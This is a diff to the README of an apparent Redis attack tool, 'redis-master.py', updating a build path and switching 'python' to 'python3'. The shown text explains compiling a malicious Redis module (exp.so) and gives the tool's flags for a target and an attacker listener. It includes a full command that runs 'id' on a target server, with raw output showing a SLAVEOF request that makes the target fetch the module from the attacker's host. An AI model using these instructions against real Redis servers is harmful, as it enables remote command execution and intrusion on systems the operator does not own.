@@ -13,7 +13,7 @@ Python 3.x
 Compile exploit:
 
 ``` bash
-cd RedisModulesSDK/exp/
+cd RedisModulesSDK/
 make
 ```
 
@@ -22,7 +22,7 @@ Then, exp.so is in `RedisModulesSDK/exp.so`.
 Help:
 
 ```
-➜ python redis-master.py -h
+➜ python3 redis-master.py -h
 
 usage: redis-master.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-f FILE]
                        [-c COMMAND] [-a AUTH] [-v]
@@ -48,7 +48,7 @@ optional arguments:
 Execute command:
 
 ```
-➜ python redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c "id"
+➜ python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c "id"
 
 >> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$13\r\n*.*.*.*\r\n$4\r\n8888\r\n'
 >> receive data: b'+OK\r\n'
